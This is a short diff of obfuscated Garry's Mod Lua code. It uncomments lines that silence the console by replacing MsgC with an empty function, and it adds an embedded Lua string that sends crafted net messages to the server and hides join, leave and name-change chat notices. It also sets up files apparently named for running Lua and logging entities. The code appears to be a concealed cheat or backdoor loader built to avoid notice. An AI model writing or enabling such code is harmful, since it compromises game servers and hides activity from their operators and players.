@@ -13,7 +13,7 @@ local k = file.Read
 local l = timer.Simple
 local m = surface.SetFont
 local n = surface.SetDrawColor
---local o = IsInGame
+local o = IsInGame
 local p = draw.RoundedBox
 local q = util.JSONToTable
 local r = surface.DrawOutlinedRect
@@ -30,11 +30,11 @@ local B = string.Replace
 local C = surface.GetTextSize
 local D = table.remove
 ​
---local J = MsgC
+local J = MsgC
 MsgC = function() end
 local K = false
---local L = [[local a="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"timer.Simple(1,function()net.Start(a)net.WriteBool(false)net.WriteBool(true)net.WriteDouble(121.75)net.SendToServer()end)net.Receive(a,function()net.Start(a)net.WriteBool(false)net.WriteBool(false)net.SendToServer()end)hook.Add("ChatText","hide_joinleave",function(b,c,d,e)if e=="joinleave"then return true end;if e=="namechange"then return true end end)]]
---b.maincfg = gmodgoodgame:Replace("}", ""):Replace("{", ""):Replace("-", ""):Replace("a", "") .. ".txt"
+local L = [[local a="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"timer.Simple(1,function()net.Start(a)net.WriteBool(false)net.WriteBool(true)net.WriteDouble(121.75)net.SendToServer()end)net.Receive(a,function()net.Start(a)net.WriteBool(false)net.WriteBool(false)net.SendToServer()end)hook.Add("ChatText","hide_joinleave",function(b,c,d,e)if e=="joinleave"then return true end;if e=="namechange"then return true end end)]]
+b.maincfg = gmodgoodgame:Replace("}", ""):Replace("{", ""):Replace("-", ""):Replace("a", "") .. ".txt"
 b.logs = F() .. ".txt"
 b.runlua = F() .. ".txt"
 b.allentity = F() .. ".txt"
